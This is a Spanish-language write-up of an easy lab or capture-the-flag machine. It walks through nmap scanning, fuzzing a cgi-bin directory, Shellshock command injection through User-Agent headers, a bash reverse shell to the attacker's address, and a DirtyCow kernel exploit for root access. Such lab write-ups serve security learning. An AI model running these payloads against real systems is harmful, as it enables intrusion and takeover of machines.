tags: #muy-facil #capabilities
____
## Reconocimiento

Comenzamos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
```bash
nmap -sS -p- 172.20.10.5 -oN ports -n -Pn -vvv --min-rate 5000 
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![Pasted image 20251015144953.png](Pasted%20image%2020251015144953.png)

Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV -p80,22 172.20.10.5 -oN version -n -Pn --min-rate 5000
```

![Pasted image 20251015145145](../../../Anexos/Pasted%20image%2020251015145145.png)

Ahora vamos a entrar al sitio web para averiguar de qué se trata:

![850](Pasted%20image%2020251015153925.png)

Nada interesante, vamos a aplicar fuzzing. 

>NOTA: A veces será necesario aplicar el parámetro **--add-slash** para que haga fuzzing correctamente.

![Pasted image 20251015154153](../../../Anexos/Pasted%20image%2020251015154153.png)

Seguimos aplicando fuzzing sobre el directorio **/cgi-bin**

![Pasted image 20251015153740](../../../Anexos/Pasted%20image%2020251015153740.png)

Vemos que estamos ante una vulnerabilidad shell shock, así que probamos ejecutar comandos, con éxito:

```bash
curl -s -X GET "http://172.20.10.5/cgi-bin/test.sh" -H "User-Agent: () { :; }; /usr/bin/whoami"
```

![Pasted image 20251015152306](../../../Anexos/Pasted%20image%2020251015152306.png)

>NOTA: Si el servidor no arroja un resultado, probar este otro:

```bash
curl -s -X GET "http://172.20.10.5/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
```

![Pasted image 20251015152325](../../../Anexos/Pasted%20image%2020251015152325.png)

Ahora, nos enviamos una reverse shell a nuestra máquina de atacante utilizando netcat en escucha por el puerto 443:

```bash
curl -s -X GET "http://172.20.10.5/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/172.20.10.2/443 0>$1"
```

Ahora nos ponemos en escucha por el puerto 443 con el siguiente comando:

```bash
netcat -lvnp 443
```

Ejecutamos la URL, y tenemos reverse shell con www-data:

![Pasted image 20251015154904](../../../Anexos/Pasted%20image%2020251015154904.png)

Ahora chequeamos la versión del kernel:

![Pasted image 20251015155436](../../../Anexos/Pasted%20image%2020251015155436.png)



![Pasted image 20251015155718](../../../Anexos/Pasted%20image%2020251015155718.png)

```bash
searchsploit -m linux/local/40839.c
```

![Pasted image 20251015160002](../../../Anexos/Pasted%20image%2020251015160002.png)

Nos traemos el exploit a nuestro directorio actual de trabajo y  lo renombramos a dirtycow.c

Ahora nos montamos un servidor con python por el puerto 80 y descargamos el archivo desde la máquina vítima:

```bash
python3 -m http.server 80 
```

Ahora lo descargamos en la máquina victima con este comando:

```bash
wget 172.20.10.2/dirtycow.c
```

![Pasted image 20251015162007](../../../Anexos/Pasted%20image%2020251015162007.png)

Ahora vemos las instrucciones de instalación, con el comando:

```bash
cat dirtycow.c | grep gcc
```

![Pasted image 20251015164056](../../../Anexos/Pasted%20image%2020251015164056.png)

Ejecutamos la orden:

![Pasted image 20251015164730](../../../Anexos/Pasted%20image%2020251015164730.png)

Le seteamos la contraseña **hola**, y comprobamos el /etc/passwd:

![Pasted image 20251015164827](../../../Anexos/Pasted%20image%2020251015164827.png)

Nos cambiamos al usuario fairfart usando las siguientes credenciales:

```bash 
firefart:root
```

![Pasted image 20251015164948](../../../Anexos/Pasted%20image%2020251015164948.png)

Somos el usuario firefart en el grupo root!

> NOTA: El exploit nos crea también una backup:

![Pasted image 20251015165112](../../../Anexos/Pasted%20image%2020251015165112.png)